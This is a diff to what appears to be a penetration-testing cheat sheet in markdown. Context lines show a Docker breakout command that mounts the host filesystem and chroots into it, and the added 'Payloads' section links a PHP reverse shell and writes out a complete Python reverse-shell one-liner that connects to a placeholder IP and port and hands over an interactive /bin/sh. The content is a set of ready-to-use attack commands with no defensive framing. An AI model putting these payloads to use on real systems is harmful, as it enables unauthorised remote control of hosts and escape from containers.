@@ -72,6 +72,20 @@ docker run -it -v /:/host/ <docker image> chroot /host/ bash
 ```
 * [https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
 
+
+## Payloads
+
+### PHP Reverse Shell
+
+* [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
+
+
+### Python Reverse Shell
+
+```powershell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
 ## Misc
 
 ### Start local server
